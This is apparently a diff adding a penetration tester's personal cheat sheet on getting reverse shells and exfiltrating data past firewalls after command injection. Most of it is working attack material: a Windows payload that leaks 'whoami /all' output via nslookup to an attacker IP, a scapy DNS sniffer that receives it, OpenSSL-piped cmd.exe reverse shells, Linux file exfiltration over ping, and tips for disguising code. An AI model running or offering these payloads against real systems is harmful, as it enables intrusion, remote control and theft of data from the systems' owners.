@@ -1,0 +1,96 @@
+When I got a code execution on the underlying system (I can ping myself or extract information from the system) but all attempts to get a full-fledged reverse shell failed it means that there is a firewall in place so to bypass it I can use
+
+On windows system
+               -I can use Ping shell (see Appendix for the code)
+               -Poison nslookup
+Param=for /f “tokens=1-26” %a in (‘whoami /all’) do (nslookup %q:%w:%e:%r:%t:%y:%u:%i:%o:%p:%a:%s:%d:%f:%g:%h:%j:%k:%l:%z:%x:%c:%v:%b:%n:%m <my_ip>)
+
+#those 1,2,3.. Are number of columns that will be read
+
+(on my terminal)
+Responder –I tun0 -vv
+
+ or I can use the following python script 
+
+from scapy.all import *
+from threading import Thread
+
+class Sniffer(Thread):
+ def __init__(self,interface=”tun0”):
+  super().__init__()
+  self.interface=interface
+
+
+
+ def run(self):
+  sniff(iface=self.interface,filter=”ip”,prn=self.print_packet)
+
+def print_packet(self,packet):
+  if packet.haslayer(DNS) and packet.dst==53:
+   qname=packet.qd.name
+   qtype=packet.qd.type
+   if qtype==1:
+     print(‘PS C:\> ’+qname[:-2].replace(“:”,” “).strip())
+     print(‘\n’)
+   
+
+sniff=Sniffer()
+sniff.start()
+sniff.join()
+
+
+OpenSSL shell
+
+generate certificate
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3 -nodes
+
+to make it work I need 2 open ports and in order ot learn what ports I can use I will (this is time consuming but works):
+(on my terminal)
+openssl s_server -key key.pem cert cert.pem -port <1-65535>
+(on burp)
+param=start cmd /c “C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe -quiet -connect <attacker_ip>:<1-65535>| cmd.exe”
+If I got the connection - > I found the first open port and now I need to repeat it to find the second open port
+
+setup openssl server on one terminal
+
+openssl s_server -quiet -key key.pem  -cert cert.pem -port <first_open_port>
+
+setup openssl server on another terminal
+openssl s_server -key key.pem -cert cert.pem -port <second_open_port>
+
+in the vulnerable parameter
+param=start cmd /c “C:\progra<~1>_or<~2>\OpenSsl-<version>\bin\openssl.exe s_client -quiet -connect <attacker_ip>:<first_open_port>| cmd.exe | cmd /c C:\progra<~1>_or<~2>\OpenSSl-<version\bin\openssl.exe s_client -connect <attacker_ip>:<second_open_port>”
+
+progra~1 - program files x64
+progra~2 - program files x86
+Available openssl versions: 
+v0.9.1
+v0.9.2
+v0.9.3
+v0.9.4
+v0.9.5
+v0.9.6
+v0.9.7
+v0.9.8
+v1.0.0
+v1.0.1
+v1.0.2
+v1.1.0
+v1.1.1
+v3.0.0
+
+
+If vulnerable I should get a shell 
+
+On linux system
+                -I can use forward-shell (see Appendix for the code)
+                -I can read local files by using ICMP
+Param=xxd –p –c 16 <file_I_want_read> | while read line;do ping –c 1 –p  $line <my_ip>;done
+ 
+
+
+
+Generic way:
+Get a shell over IPv6
+Get a shell over common ports e.g 80,443
+Change functions’ names into sth innocent
